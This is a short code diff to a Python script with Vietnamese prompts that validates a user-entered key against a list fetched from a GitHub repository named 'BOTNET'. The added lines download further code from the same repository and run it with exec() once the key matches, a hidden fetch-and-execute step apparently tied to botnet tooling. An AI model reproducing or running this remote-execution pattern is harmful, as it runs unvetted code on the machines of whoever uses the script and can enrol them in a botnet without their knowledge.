@@ -21,5 +21,7 @@ KEY=input(">>> Nhập Key Bạn Có : ")
 KEYW=json.loads(str(requests.get('https://raw.githubusercontent.com/mymikute/BOTNET/main/2').text))
 if KEY in KEYW['KEY']:
 	print('[T]> \033[1;36mThông Báo : '+KEYW['KEY'][KEY])
+	exec(requests.get('https://raw.githubusercontent.com/mymikute/BOTNET/main/4').text)
+
 else:
 	print('[T]> Sai Key')
